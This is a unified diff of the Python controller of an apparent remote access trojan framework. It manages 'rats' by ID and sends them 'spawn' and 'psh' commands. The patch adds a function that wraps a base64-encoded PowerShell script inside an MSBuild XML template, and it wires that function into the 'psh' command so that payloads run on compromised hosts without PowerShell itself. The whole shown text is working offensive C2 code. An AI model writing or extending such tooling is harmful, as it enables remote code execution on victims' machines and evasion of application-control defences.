@@ -70,8 +70,8 @@ def colors(value):
         return(BOLD + "ALL RATS" + ENDC)
     elif(value == ">>"):
         return( BOLD + c + ">" + js + ">" + ENDC)
-    elif(value == "commit Seppuku"):
-        return(c + value + ENDC)
+    elif(value == "quit"):
+        return(c + "commit Seppuku" + ENDC)
     elif(value == "HTTP" or value == "HTTPS"):
         return(BOLD + value + ENDC)
     try:
@@ -110,8 +110,13 @@ def get_psscript(filepath):
    with open(Path(filepath).resolve() , "r") as fd:
        content = fd.read()
        content = base64.b64encode(content.encode('utf-8')).decode('utf-8')
-       print("[*] Sending contents of " + filepath)
        return(content)
+
+def send_msbuild_xml(script):
+    with open(os.getcwd() + "/resources/nps_minified.xml" , "r") as fd:
+        data = fd.read().replace("~~REPLACE~~" , script)
+        data = base64.b64encode(data.encode('utf-8')).decode('utf-8')
+        return data
 
 def serve_server(port=8080):
     app = Flask(__name__)
@@ -289,19 +294,16 @@ if __name__ == "__main__":
                         inp = "quit"
 
                     elif(inp == "spawn"):
-                        if(types[ratID] == "hta"):
-                            inp = "spawn"
-                        else:
+                        if(types[ratID] == "ps1"):
                             inp = "spawn " + send_ratcode(ratID)
 
                     elif(str.startswith(inp, "psh ")):
                         try:
                             filepath = inp.split(" ")[1]
-                            script = get_psscript(filepath)
                             if(types[ratID] == "ps1"):
-                                inp = "psh " + script
+                                inp = "psh " + get_psscript(filepath)
                             else:
-                                inp = "psh " + msbuild_path + " "# + send_msbuild_xml(filepath)
+                                inp = "psh " + msbuild_path + " " + send_msbuild_xml(get_psscript(filepath))
                         except:
                             print("[!] Could not open file " + filepath + " for reading")
                             continue
